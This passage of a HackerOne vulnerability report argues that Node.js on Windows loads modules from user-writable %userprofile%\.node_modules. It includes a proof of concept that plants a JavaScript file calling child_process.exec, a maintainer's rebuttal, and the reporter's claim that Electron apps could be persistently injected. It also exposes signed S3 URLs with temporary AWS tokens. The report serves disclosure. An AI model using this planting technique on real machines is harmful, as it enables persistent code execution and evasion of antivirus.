class=\"dl\"\u003e\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt looks like normal behavior. \u003c/p\u003e\n\n\u003cp\u003eBut some side effect exists.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"notfound.PNG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/992/00270d740eb1095ef7ce9b383e84c211706e2347/notfound.PNG?response-content-disposition=attachment%3B%20filename%3D%22notfound.PNG%22%3B%20filename%2A%3DUTF-8%27%27notfound.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063112Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=fa6da07b35fa2c8281520449ea0adc6fe7f23f3852830e56eeffe34a55855a54\" data-attachment-type=\"image/png\"\u003enotfound.PNG (F516992)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003elet\u0026#39;s test like below\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003emkdir %userprofile%\\.node_modules\ncd %userprofile%\\.node_modules\necho const { exec } = require(\u0026#39;child_process\u0026#39;).exec(\u0026quot;notepad\u0026quot;) \u0026gt; a.js\n\nC:\\Users\\cdpyt\\.node_modules\u0026gt;dir\n C 드라이브의 볼륨에는 이름이 없습니다.\n 볼륨 일련 번호: 1AAF-F852\n\n C:\\Users\\cdpyt\\.node_modules 디렉터리\n\n2019-06-26  오후 04:01    \u0026lt;DIR\u0026gt;          .\n2019-06-26  오후 04:01    \u0026lt;DIR\u0026gt;          ..\n2019-06-26  오후 04:01                60 a.js\n               1개 파일                  60 바이트\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003erun node and \u003ccode\u003erequire(\u0026#39;a\u0026#39;)\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"notepad.PNG\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/991/f7dde5320f2a286081f5e24887f7e1588ceb0d0e/notepad.PNG?response-content-disposition=attachment%3B%20filename%3D%22notepad.PNG%22%3B%20filename%2A%3DUTF-8%27%27notepad.PNG\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063112Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=bb259dab0c68be7f762b7b8415f87f6619e3620dabd6bc0ccccdb651883af376\" data-attachment-type=\"image/png\"\u003enotepad.PNG (F516991)\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIt is a really serious bug because many software uses nodes on Windows systems!\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003enode\u003c/code\u003e will attempt to install the library file under the node_modules in the current path or in the initialized path using \u003ccode\u003enpm init\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003ea special case is global installation with \u003ccode\u003enpm install -g [package names]\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eglobal installation uses \u003ccode\u003e%appdata%\\npm\u003c/code\u003e path.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eC:\\Users\\cdpyt\\.node_modules\u0026gt;where eslint\nC:\\Users\\cdpyt\\AppData\\Roaming\\npm\\eslint\nC:\\Users\\cdpyt\\AppData\\Roaming\\npm\\eslint.cmd\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo, on a Windows system, \u003ccode\u003enode\u003c/code\u003e does not need to use \u003ccode\u003e%userprofile\\.node_modules\u003c/code\u003e and \u003ccode\u003e%userprofile\\.node_libraries\u003c/code\u003e paths in general cases.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003enode\u003c/code\u003e has really powerful features on Windows. \u003c/p\u003e\n\n\u003cp\u003eIf this bug is exploited by malicious code, AV can be easily bypassed.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003col\u003e\n\u003cli\u003einstallation node latest version(v12.4.0) on windows\u003c/li\u003e\n\u003cli\u003ecopy and paste below commands to \u003ccode\u003ecmd.exe\u003c/code\u003e\n    \u003ccode\u003ecmd\n    mkdir %userprofile%\\.node_modules\n    cd %userprofile%\\.node_modules\n    echo const { exec } = require(\u0026#39;child_process\u0026#39;).exec(\u0026quot;notepad\u0026quot;) \u0026gt; a.js\n\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003erun node and type \u003ccode\u003erequrie(\u0026#39;a\u0026#39;)\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003enotpad.exe will be poped!\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"suggested-fix\"\u003eSuggested fix\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eFix the \u003ccode\u003eloader.js\u003c/code\u003e \n\u003ccode\u003ejs\nif (isWindows) {\n//homeDir = process.env.USERPROFILE;\nnodePath = process.env.NODE_PATH;\n} else {\nhomeDir = safeGetenv(\u0026#39;HOME\u0026#39;);\nnodePath = safeGetenv(\u0026#39;NODE_PATH\u0026#39;);\n}\n\u003c/code\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cp\u003eThe executables were downloaded from the official web site.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eC:\\Users\\cdpyt\\.node_modules\u0026gt;node -v\nv12.4.0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIf \u003ccode\u003erequire\u003c/code\u003e does not find the current path of the module, the node tries to search the global path.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e%userprofile%\u003c/code\u003e path allows you to create a new JavaScript file.\u003c/p\u003e\n\n\u003cp\u003eIf the target application uses \u003ccode\u003enode\u003c/code\u003e or\u003ccode\u003eelectron\u003c/code\u003e and does not do absolute path checking before \u003ccode\u003erequire\u003c/code\u003e every time, it is dangerous for potential attacks.\u003c/p\u003e\n\n\u003cp\u003eAttackers should target applications that fail to load library files. However, these behaviors are easy to find.\u003c/p\u003e\n\n\u003cp\u003eAn attacker can create JavaScript files in a variety of ways. This is a more safe way to create pe files.\u003c/p\u003e\n\n\u003cp\u003eAfter the creation to a specific path a javascript file, the target system will permanently infect.\u003c/p\u003e\n","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":516991,"file_name":"notepad.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/991/f7dde5320f2a286081f5e24887f7e1588ceb0d0e/notepad.PNG?response-content-disposition=attachment%3B%20filename%3D%22notepad.PNG%22%3B%20filename%2A%3DUTF-8%27%27notepad.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063113Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=a68d780309a5268d6103c5c7392b585fdfa261d271cabd74b4bf9fa825941474","file_size":9370,"type":"image/png"},{"id":516992,"file_name":"notfound.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/516/992/00270d740eb1095ef7ce9b383e84c211706e2347/notfound.PNG?response-content-disposition=attachment%3B%20filename%3D%22notfound.PNG%22%3B%20filename%2A%3DUTF-8%27%27notfound.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063113Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=828b6216c77e51e2c1d3afa85fb67dc79ab03700fc1f0ee7d2fd66cd1415d76a","file_size":115430,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":3,"voters":["brahim_boufakri01","h2x0","weebcunt"],"structured_scope":{"databaseId":666,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/nodejs/node","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5200978,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm not understanding how this is a security problem, since there appears to be no privilege escalation. If an attacker has write-access to the user's directories, don't they already have total control? The attackers can replace the node executable, they can replace any of the js files that comprise the application's source (instead of putting js files into the default require path as you demonstrate). Also, an attacker that controls the startup environment already has the ability to inject arbitrary code via NODE_OPTIONS. \n```\n% echo 'console.log(\"attack!\")' \u003e r.js\n% node -e 'console.log(\"wave\")'\nwave\n% NODE_OPTIONS=\"-r ./r.js\" node -e 'console.log(\"wave\")'\nattack!\nwave\n```\n","markdown_message":"\u003cp\u003eI\u0026#39;m not understanding how this is a security problem, since there appears to be no privilege escalation. If an attacker has write-access to the user\u0026#39;s directories, don\u0026#39;t they already have total control? The attackers can replace the node executable, they can replace any of the js files that comprise the application\u0026#39;s source (instead of putting js files into the default require path as you demonstrate). Also, an attacker that controls the startup environment already has the ability to inject arbitrary code via NODE_OPTIONS. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e% echo \u0026#39;console.log(\u0026quot;attack!\u0026quot;)\u0026#39; \u0026gt; r.js\n% node -e \u0026#39;console.log(\u0026quot;wave\u0026quot;)\u0026#39;\nwave\n% NODE_OPTIONS=\u0026quot;-r ./r.js\u0026quot; node -e \u0026#39;console.log(\u0026quot;wave\u0026quot;)\u0026#39;\nattack!\nwave\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-06-26T17:21:09.325Z","updated_at":"2019-06-26T17:21:09.325Z","actor":{"username":"octetcloud","cleared":false,"url":"/octetcloud","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/210/672/27b2c0c2193cfb366f7889374e7ce71077431f74_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5201241,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hello! \nI'm not good at English. Please consider it.\n\nI understand and agree with your opinion. `node.js` itself is not a problem.\nHowever, many users use many applications built with `Electron`.\nand they use tons of third-party libraries.\nIn case, one of the libraries has a wrong code like\n```js\nxxx.js\n// doesn't exists current path `mytest.js`\nconst {awsome} = require('mytest');\n```\nabove code tries to search `%userprofile%\\.node_modules`. \nThis is because loader.js added the path.\n```js\n //can be easily exploited  \n  if (homeDir) {\n    paths.unshift(path.resolve(homeDir, '.node_libraries'));\n    paths.unshift(path.resolve(homeDir, '.node_modules'));\n  }\n```\nand then if i wrote  a file`%userprofile%\\.node_modules\\mytest.js`\n````js\necho const { exec } = require('child_process').exec(\"notepad\")\n```\nIn this case, you can continue to run arbitrary JavaScript code unlike adding environment variables.\n\non Windows system, ES5+ syntax javascript based malware does not exist.\nand the node.js has a powerful feature to interact with OS.\n\nI think can have a big problem in the node.js client ecosystem.\nYou can inject JavaScript code into software such as `slack, discord, vscode`\nBecause node.js already added  `%userprofile%\\.node_modules` and `%userprofile%\\.node_libraries` \n\nIf this software is installed in the path under `%ProgramFiles%` can be safer.\nWindows has a DACL\n\n```cmd\nC:\\Users\\cdpyt\u003eicacls %userprofile%\nC:\\Users\\cdpyt NT AUTHORITY\\SYSTEM:(OI)(CI)(F)\n               BUILTIN\\Administrators:(OI)(CI)(F)\n               DESKTOP-H9K1B8N\\cdpyt:(OI)(CI)(F)\n               Everyone:(RX)\n```\n\n%userprofile% is writeable with `DESKTOP-H9K1B8N\\cdpyt:(OI)(CI)(F)` permission\n\n```\nC:\\Users\\cdpyt\u003eicacls \"%ProgramFiles%\"\nC:\\Program Files NT SERVICE\\TrustedInstaller:(F)\n                 NT SERVICE\\TrustedInstaller:(CI)(IO)(F)\n                 NT AUTHORITY\\SYSTEM:(M)\n                 NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(F)\n                 BUILTIN\\Administrators:(M)\n                 BUILTIN\\Administrators:(OI)(CI)(IO)(F)\n                 BUILTIN\\Users:(RX)\n                 BUILTIN\\Users:(OI)(CI)(IO)(GR,GE)\n                 CREATOR OWNER:(OI)(CI)(IO)(F)\n                 APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(RX)\n                 APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)\n                 APPLICATION PACKAGE AUTHORITY\\모든 제한된 응용 프로그램 패키지:(RX)\n                 APPLICATION PACKAGE AUTHORITY\\모든 제한된 응용 프로그램 패키지:(OI)(CI)(IO)(GR,GE)\n```\nCurrent user is `BUILTIN\\Users:(RX)` so I can't write under %ProgramFiles% path before gain administrator privileges.\n\nabove software are trying load to the module from the current installation path.\n\nin these cases, an attacker can not inject javascript code.\n\nbecause if an attacker writes to file under `%ProgramFiles%`, they need to bypass UAC.\n\nbut `node`  added `%userprofile%\\.node_modules` and `%userprofile%\\.node_libraries` \n\nso an attacker can write a file without UAC bypass.\n\nI've attached simple PoC.\n\nThank you.  \n\n\n\n","markdown_message":"\u003cp\u003ehello! \u003cbr\u003e\nI\u0026#39;m not good at English. Please consider it.\u003c/p\u003e\n\n\u003cp\u003eI understand and agree with your opinion. \u003ccode\u003enode.js\u003c/code\u003e itself is not a problem.\u003cbr\u003e\nHowever, many users use many applications built with \u003ccode\u003eElectron\u003c/code\u003e.\u003cbr\u003e\nand they use tons of third-party libraries.\u003cbr\u003e\nIn case, one of the libraries has a wrong code like\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003exxx\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ejs\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// doesn\u0026#39;t exists current path `mytest.js`\u003c/span\u003e\n\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nx\"\u003eawsome\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003emytest\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eabove code tries to search \u003ccode\u003e%userprofile%\\.node_modules\u003c/code\u003e. \u003cbr\u003e\nThis is because loader.js added the path.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e \u003cspan class=\"c1\"\u003e//can be easily exploited  \u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003epaths\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eunshift\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.node_libraries\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003epaths\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eunshift\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eresolve\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003ehomeDir\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e.node_modules\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand then if i wrote  a file\u003ccode\u003e%userprofile%\\.node_modules\\mytest.js\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eecho\u003c/span\u003e \u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"nx\"\u003eexec\u003c/span\u003e \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003echild_process\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nx\"\u003eexec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003enotepad\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn this case, you can continue to run arbitrary JavaScript code unlike adding environment variables.\u003c/p\u003e\n\n\u003cp\u003eon Windows system, ES5+ syntax javascript based malware does not exist.\u003cbr\u003e\nand the node.js has a powerful feature to interact with OS.\u003c/p\u003e\n\n\u003cp\u003eI think can have a big problem in the node.js client ecosystem.\u003cbr\u003e\nYou can inject JavaScript code into software such as \u003ccode\u003eslack, discord, vscode\u003c/code\u003e\u003cbr\u003e\nBecause node.js already added  \u003ccode\u003e%userprofile%\\.node_modules\u003c/code\u003e and \u003ccode\u003e%userprofile%\\.node_libraries\u003c/code\u003e \u003c/p\u003e\n\n\u003cp\u003eIf this software is installed in the path under \u003ccode\u003e%ProgramFiles%\u003c/code\u003e can be 